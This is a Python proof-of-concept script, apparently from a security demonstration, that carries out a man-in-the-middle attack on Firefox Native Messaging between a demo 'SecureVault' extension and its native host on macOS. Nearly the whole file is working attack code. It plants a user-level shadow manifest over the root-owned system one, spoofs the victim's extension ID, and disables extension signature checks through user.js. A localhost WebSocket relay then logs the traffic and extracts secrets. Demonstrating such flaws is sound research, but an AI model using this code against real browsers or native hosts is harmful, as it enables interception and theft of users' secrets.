#!/usr/bin/env python3
"""
Attack 1: Bidirectional MITM
=============================
Intercepts the Native Messaging channel between the demo victim extension and
the real NM host via a 4-component relay chain:

  Demo victim Firefox extension
      ↕ NM stdio
  MITM wrapper  (this script, spawned by victim Firefox — parent IS Firefox)
      ↕ WebSocket :13501
  Relay         (this script in setup mode — logs all traffic)
      ↕ WebSocket :13500
  Passthrough extension  (in attacker headless Firefox)
      ↕ browser.runtime.connectNative
  Real NM host  (spawned by attacker Firefox — parent IS Firefox)

Modes:
  --setup              (run by tester) : narrated walkthrough + relay server
  <gecko-id>           (spawned by Firefox) : MITM wrapper — bridges stdio↔relay

Run: python3 attack1_bidirectional_mitm.py --setup
"""

import sys, os, json, struct, subprocess
import asyncio, signal, shutil, time, urllib.request

# ── Paths ─────────────────────────────────────────────────────────────────────

SCRIPT_DIR       = os.path.dirname(os.path.abspath(__file__))
DEMO_DIR         = os.path.dirname(SCRIPT_DIR)
DEMO_EXT         = os.path.join(DEMO_DIR, "demo_extension", "manifest.json")
PASSTHROUGH_EXT  = os.path.join(SCRIPT_DIR, "passthrough_extension")
ATTACKER_PROFILE = os.path.join(SCRIPT_DIR, ".attacker_profile_a1")
INTERCEPT_LOG    = os.path.join(SCRIPT_DIR, "mitm_intercept.log")

HOST_NAME          = "com.demo.securevault"
REAL_MANIFEST_NAME = f"{HOST_NAME}_real"
SYSTEM_NM_DIR      = "/Library/Application Support/Mozilla/NativeMessagingHosts"
USER_NM_DIR        = os.path.expanduser(
    "~/Library/Application Support/Mozilla/NativeMessagingHosts"
)
SHADOW_MANIFEST = os.path.join(USER_NM_DIR, f"{HOST_NAME}.json")

FIREFOX_BIN   = "/Applications/Firefox.app/Contents/MacOS/firefox"
WS_UPSTREAM   = 13500   # passthrough extension connects here (real-host side)
WS_DOWNSTREAM = 13501   # MITM wrapper connects here (victim-Firefox side)

GECKO_ID = "securevault@demo"

GECKODRIVER_PORT = 4444
_geckodriver_proc = [None]

# ── Printing helpers ───────────────────────────────────────────────────────────

def banner():
    print("\n" + "="*65)
    print("  ATTACK 1: BIDIRECTIONAL MITM")
    print("  Native Messaging channel interception via 4-component relay")
    print("="*65)

def control(n, msg):
    print(f"\n  Control {n}: {msg}")

def step(n, title):
    print(f"\n  Step {n}: {title}")
    print(f"  {'─'*55}")

def info(msg):
    print(f"            {msg}")

def bypass(msg):
    print(f"\n  >> {msg}")

def pause(msg="  Press Enter to continue..."):
    input(f"\n{msg}")


# ── NM I/O helpers ─────────────────────────────────────────────────────────────

def read_nm(pipe):
    raw = pipe.read(4)
    if len(raw) < 4:
        return None
    length = struct.unpack('<I', raw)[0]
    data = pipe.read(length)
    if len(data) < length:
        return None
    return json.loads(data.decode('utf-8'))

def write_nm(pipe, msg):
    encoded = json.dumps(msg).encode('utf-8')
    pipe.write(struct.pack('<I', len(encoded)))
    pipe.write(encoded)
    pipe.flush()


# ── Manifest helpers ───────────────────────────────────────────────────────────

def read_system_manifest():
    path = os.path.join(SYSTEM_NM_DIR, f"{HOST_NAME}.json")
    try:
        with open(path) as f:
            return json.load(f)
    except FileNotFoundError:
        print(f"  ERROR: System manifest not found. Run install.sh first.")
        sys.exit(1)
    except PermissionError:
        print(f"  ERROR: Cannot read {path}. Run: sudo chmod 644 {path}")
        sys.exit(1)

def write_shadow_manifest(wrapper_path):
    os.makedirs(USER_NM_DIR, exist_ok=True)
    manifest = {
        "name": HOST_NAME,
        "description": "MITM wrapper",
        "path": wrapper_path,
        "type": "stdio",
        "allowed_extensions": [GECKO_ID]
    }
    with open(SHADOW_MANIFEST, 'w') as f:
        json.dump(manifest, f, indent=2)

def write_real_manifest(real_host_path):
    """Write _real manifest to the user-level Mozilla NM path.

    Firefox ignores profile-dir NativeMessagingHosts/ — unlike Chrome it always
    reads from the OS-level paths. User-level is writable without root.
    """
    os.makedirs(USER_NM_DIR, exist_ok=True)
    manifest = {
        "name": REAL_MANIFEST_NAME,
        "description": "Real demo victim host — for attacker Firefox",
        "path": real_host_path,
        "type": "stdio",
        "allowed_extensions": [GECKO_ID]
    }
    path = os.path.join(USER_NM_DIR, f"{REAL_MANIFEST_NAME}.json")
    with open(path, 'w') as f:
        json.dump(manifest, f, indent=2)
    return path

def restore_shadow():
    if os.path.exists(SHADOW_MANIFEST):
        os.remove(SHADOW_MANIFEST)
        print("  Cleaned up: shadow manifest removed.")

def remove_real_manifest():
    path = os.path.join(USER_NM_DIR,
                        f"{REAL_MANIFEST_NAME}.json")
    if os.path.exists(path):
        os.remove(path)
    print("  Cleaned up: _real manifest removed.")


# ── Relay ─────────────────────────────────────────────────────────────────────

class Relay:
    """
    Two-sided WebSocket relay:
      upstream   (:13500) <- passthrough extension (real-host side)
      downstream (:13501) <- MITM wrapper          (victim-Firefox side)
    Queues buffer messages when one side is temporarily disconnected.
    """
    def __init__(self):
        self._q_to_dn = asyncio.Queue()   # real host -> victim
        self._q_to_up = asyncio.Queue()   # victim -> real host
        self._ws_up   = None
        self._ws_dn   = None
        self._evt_up  = asyncio.Event()
        self._evt_dn  = asyncio.Event()

    def _log(self, direction, msg):
        line = f"[{direction}] {json.dumps(msg)}"
        print(f"  {line}")
        with open(INTERCEPT_LOG, 'a') as f:
            f.write(line + '\n')
        if msg.get('secret') is not None:
            print("\n" + "*"*65)
            print(f"  Secret extracted from intercepted traffic:")
            print(f"            {msg['secret']}")
            print("*"*65 + "\n")

    async def handle_upstream(self, ws):
        """Passthrough extension connects here — carries real-host responses."""
        info("  Passthrough extension connected to relay.")
        self._ws_up = ws
        self._evt_up.set()
        try:
            async for raw in ws:
                try:
                    msg = json.loads(raw)
                except Exception:
                    continue
                self._log("HOST->EXT", msg)
                await self._q_to_dn.put(raw)
        except Exception:
            pass
        finally:
            self._ws_up = None
            self._evt_up.clear()

    async def handle_downstream(self, ws):
        """MITM wrapper connects here — carries demo victim extension messages."""
        info("  MITM wrapper connected to relay (victim triggered extension).")
        self._ws_dn = ws
        self._evt_dn.set()
        try:
            async for raw in ws:
                try:
                    msg = json.loads(raw)
                except Exception:
                    continue
                self._log("EXT->HOST", msg)
                await self._q_to_up.put(raw)
        except Exception:
            pass
        finally:
            self._ws_dn = None
            self._evt_dn.clear()

    async def forward_to_downstream(self):
        """Drain real-host queue -> MITM wrapper (wait if wrapper not connected yet)."""
        while True:
            raw = await self._q_to_dn.get()
            while True:
                ws = self._ws_dn
                if ws is not None:
                    try:
                        await ws.send(raw)
                        break
                    except Exception:
                        self._ws_dn = None
                        self._evt_dn.clear()
                await self._evt_dn.wait()

    async def forward_to_upstream(self):
        """Drain victim queue -> passthrough extension (wait if ext not connected yet)."""
        while True:
            raw = await self._q_to_up.get()
            while True:
                ws = self._ws_up
                if ws is not None:
                    try:
                        await ws.send(raw)
                        break
                    except Exception:
                        self._ws_up = None
                        self._evt_up.clear()
                await self._evt_up.wait()


# ── geckodriver / Firefox launcher ────────────────────────────────────────────

def start_geckodriver():
    proc = subprocess.Popen(
        ["geckodriver", "--port", str(GECKODRIVER_PORT)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    _geckodriver_proc[0] = proc
    info(f"  geckodriver started (PID {proc.pid}, port {GECKODRIVER_PORT})")


def create_firefox_session(profile_dir):
    """POST to geckodriver /session to launch headless Firefox. Returns session_id or None."""
    capabilities = {
        "capabilities": {
            "alwaysMatch": {
                "moz:firefoxOptions": {
                    "binary": FIREFOX_BIN,
                    "args":   ["-headless", "-profile", os.path.abspath(profile_dir)],
                }
            }
        }
    }
    for _ in range(30):
        try:
            req = urllib.request.Request(
                f"http://127.0.0.1:{GECKODRIVER_PORT}/session",
                data=json.dumps(capabilities).encode("utf-8"),
                headers={"Content-Type": "application/json"},
                method="POST",
            )
            resp = urllib.request.urlopen(req, timeout=20)
            data = json.loads(resp.read())
            session_id = data["value"]["sessionId"]
            return session_id
        except Exception:
            time.sleep(0.5)
    return None


def install_addon(session_id, ext_dir):
    """POST to geckodriver moz/addon/install with directory path. Returns True/False."""
    try:
        req = urllib.request.Request(
            f"http://127.0.0.1:{GECKODRIVER_PORT}/session/{session_id}/moz/addon/install",
            data=json.dumps({"path": os.path.abspath(ext_dir), "temporary": True}).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        urllib.request.urlopen(req, timeout=10)
        return True
    except Exception:
        return False


def kill_geckodriver():
    proc = _geckodriver_proc[0]
    if proc is None:
        return
    if proc.poll() is None:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()
    _geckodriver_proc[0] = None


# ── SETUP MODE ─────────────────────────────────────────────────────────────────

def run_setup():
    banner()

    print("\n  Controls in place:")
    control(1, "The NM manifest is installed at the system level "
               "(/Library/Application Support/Mozilla/NativeMessagingHosts/), "
               "root-owned, requires administrator privileges to modify.")
    control(2, "The manifest lists allowed_extensions, Firefox only forwards "
               "connections from the specific victim extension ID to this host.")
    control(3, "The demo victim host verifies its parent process is Firefox "
               "before responding to any request.")

    pause()

    # ── Step 1: Locate the manifest ───────────────────────────────────────────
    step(1, "Locating the NM manifest")

    sys_manifest_path = os.path.join(SYSTEM_NM_DIR, f"{HOST_NAME}.json")
    if os.path.exists(sys_manifest_path):
        info(f"System manifest: {sys_manifest_path} (root-owned)")
    else:
        info("System-level manifest not found. Run install.sh first.")
        sys.exit(1)

    bypass("Bypassing Control 1: the user-level NM directory is always writable, "
           "a same-named file there silently overrides the system-level entry.")

    pause()

    # ── Step 2: Read manifest, note gecko ID, patch passthrough extension ──────
    step(2, "Reading the gecko ID and patching the passthrough extension")

    sys_manifest = read_system_manifest()
    real_host_path = sys_manifest["path"]
    info(f"Demo victim host:    {real_host_path}")
    info(f"allowed_extensions:  {sys_manifest['allowed_extensions']}")
    info("")
    info("Firefox extension IDs come from browser_specific_settings.gecko.id")
    info("in the extension's manifest.json, a fixed, human-readable string.")
    info("No key derivation required.")
    info("")
    info(f"Gecko ID: {GECKO_ID}")
    info("")
    info("The passthrough extension must declare the same gecko ID.")

    bypass("Bypassing Control 2: passthrough extension declares the victim's gecko ID, "
           "same ID, allowed_extensions passes.")

    pause()

    # ── Step 3: Write _real manifest for attacker Firefox ────────────────────
    step(3, "Writing the _real NM manifest for attacker Firefox")
    info("The passthrough extension calls connectNative('com.demo.securevault_real')")
    info("to avoid the shadow manifest. We write that manifest to the user-level Mozilla path")
    info("(Firefox ignores profile-dir NativeMessagingHosts/, unlike Chrome):")
    info("")

    real_path = write_real_manifest(real_host_path)
    info(f"  {real_path}")

    bypass("User-level Mozilla NM path is writable without elevated privileges.")

    pause()

    # ── Step 4: Plant the shadow manifest ────────────────────────────────────
    step(4, "Planting the shadow manifest")

    wrapper_sh = os.path.join(SCRIPT_DIR, ".mitm_wrapper.sh")
    python_bin = sys.executable
    with open(wrapper_sh, 'w') as f:
        f.write(f"#!/bin/bash\nexec \"{python_bin}\" "
                f"\"{os.path.abspath(__file__)}\" \"$@\"\n")
    os.chmod(wrapper_sh, 0o755)

    write_shadow_manifest(wrapper_sh)
    info(f"Shadow manifest: {SHADOW_MANIFEST}")
    info(f"Points to:       {wrapper_sh}")
    info("")
    info("Firefox spawns the MITM wrapper (parent = victim Firefox) and the real host")
    info("(parent = attacker headless Firefox). Both parent checks pass, no spoofing.")

    bypass("Bypassing Control 3: both parents are genuine Firefox processes.")

    pause()

    pt_manifest_path = os.path.join(PASSTHROUGH_EXT, "manifest.json")
    pt_bg_path       = os.path.join(PASSTHROUGH_EXT, "background.js")

    try:
        asyncio.run(_relay_main())
    except KeyboardInterrupt:
        pass
    finally:
        _do_cleanup(pt_manifest_path, pt_bg_path)


def _do_cleanup(pt_manifest_path, pt_bg_path):
    print("\n\n  Cleaning up...")
    restore_shadow()
    remove_real_manifest()
    kill_geckodriver()
    print("  Attacker headless Firefox terminated.")
    # Restore passthrough extension gecko ID to placeholder
    try:
        with open(pt_manifest_path) as f:
            m = json.load(f)
        m["browser_specific_settings"]["gecko"]["id"] = "PLACEHOLDER"
        with open(pt_manifest_path, 'w') as f:
            json.dump(m, f, indent=2)
    except Exception:
        pass
    # Restore passthrough extension background.js TARGET
    try:
        with open(pt_bg_path) as f:
            bg = f.read()
        with open(pt_bg_path, 'w') as f:
            f.write(bg.replace(f"'{REAL_MANIFEST_NAME}'", "'com.demo.securevault'"))
    except Exception:
        pass
    print("  Done.")


async def _relay_main():
    import websockets

    relay = Relay()

    # ── Step 5: Start relay + launch attacker headless Firefox ────────────────
    step(5, "Starting relay and launching attacker headless Firefox")
    info(f"Relay upstream   (passthrough extension): ws://127.0.0.1:{WS_UPSTREAM}")
    info(f"Relay downstream (MITM wrapper)         : ws://127.0.0.1:{WS_DOWNSTREAM}")

    bypass("Control 3 satisfied: real host's parent is attacker headless Firefox.")
    bypass("Signature enforcement bypassed via profile user.js preferences.")

    srv_up = await websockets.serve(relay.handle_upstream, "127.0.0.1", WS_UPSTREAM)
    srv_dn = await websockets.serve(relay.handle_downstream, "127.0.0.1", WS_DOWNSTREAM)
    asyncio.create_task(relay.forward_to_downstream())
    asyncio.create_task(relay.forward_to_upstream())

    info("")
    info(f"  Launching attacker headless Firefox via geckodriver...")
    info("  (requires geckodriver: brew install geckodriver)")

    # Wipe attacker profile from previous runs
    if os.path.exists(ATTACKER_PROFILE):
        shutil.rmtree(ATTACKER_PROFILE)
    os.makedirs(ATTACKER_PROFILE, exist_ok=True)

    # Write user.js to allow unsigned extensions
    user_js = os.path.join(ATTACKER_PROFILE, "user.js")
    with open(user_js, 'w') as f:
        f.write('user_pref("xpinstall.signatures.required", false);\n')
        f.write('user_pref("extensions.autoDisableScopes", 0);\n')
        f.write('user_pref("extensions.enabledScopes", 15);\n')

    # Patch passthrough extension gecko ID to match demo victim extension
    pt_manifest_path = os.path.join(PASSTHROUGH_EXT, "manifest.json")
    with open(pt_manifest_path) as f:
        pt = json.load(f)
    pt["browser_specific_settings"]["gecko"]["id"] = GECKO_ID
    with open(pt_manifest_path, 'w') as f:
        json.dump(pt, f, indent=2)

    # Patch background.js TARGET to _real host name
    bg_path = os.path.join(PASSTHROUGH_EXT, "background.js")
    with open(bg_path) as f:
        bg = f.read()
    with open(bg_path, 'w') as f:
        f.write(bg.replace("'com.demo.securevault'", f"'{REAL_MANIFEST_NAME}'"))

    start_geckodriver()
    loop = asyncio.get_event_loop()
    session_id = await loop.run_in_executor(None, create_firefox_session, ATTACKER_PROFILE)
    if session_id:
        info(f"  Firefox session created ({session_id[:8]}...)")
        ok = await loop.run_in_executor(None, install_addon, session_id, PASSTHROUGH_EXT)
        if ok:
            info(f"  Passthrough extension installed.")
            await asyncio.sleep(2.0)
            info(f"  Waiting for passthrough extension to connect to relay...")
        else:
            info(f"  WARNING: extension install failed, check geckodriver and Firefox.")
    else:
        info(f"  WARNING: could not create Firefox session, check geckodriver.")

    # ── Step 6: Wait for victim ───────────────────────────────────────────────
    step(6, "MITM is active, waiting for the victim")
    info("")
    info("  1. Open Firefox (your normal browser profile).")
    info("  2. Click the SecureVault extension popup -> Get Secret.")
    info("")
    info("  Intercepted messages appear below. Press Ctrl+C to stop.")
    info("")

    if os.path.exists(INTERCEPT_LOG):
        os.remove(INTERCEPT_LOG)

    try:
        await asyncio.Future()
    finally:
        srv_up.close()
        srv_dn.close()


# ── WRAPPER MODE (spawned by victim Firefox as NM host) ───────────────────────

def run_wrapper():
    asyncio.run(_run_wrapper_async())


async def _run_wrapper_async():
    import websockets

    relay_url = f"ws://127.0.0.1:{WS_DOWNSTREAM}"

    # Retry connecting to relay — setup mode must be running
    for attempt in range(15):
        try:
            async with websockets.connect(relay_url) as ws:
                loop = asyncio.get_running_loop()

                async def stdin_to_ws():
                    while True:
                        msg = await loop.run_in_executor(
                            None, lambda: read_nm(sys.stdin.buffer)
                        )
                        if msg is None:
                            break
                        await ws.send(json.dumps(msg))

                async def ws_to_stdout():
                    async for raw in ws:
                        try:
                            msg = json.loads(raw)
                        except Exception:
                            continue
                        write_nm(sys.stdout.buffer, msg)

                tasks = [
                    asyncio.create_task(stdin_to_ws()),
                    asyncio.create_task(ws_to_stdout()),
                ]
                done, pending = await asyncio.wait(
                    tasks, return_when=asyncio.FIRST_COMPLETED
                )
                for t in pending:
                    t.cancel()
            return
        except Exception:
            if attempt < 14:
                await asyncio.sleep(0.3)
            else:
                sys.exit(1)


# ── Entry point ────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--setup":
        run_setup()
    elif len(sys.argv) > 1:
        # Firefox spawns this as NM host: argv[1]=manifest_path argv[2]=gecko_id
        run_wrapper()
    else:
        print("Usage:")
        print("  python3 attack1_bidirectional_mitm.py --setup")
        sys.exit(1)
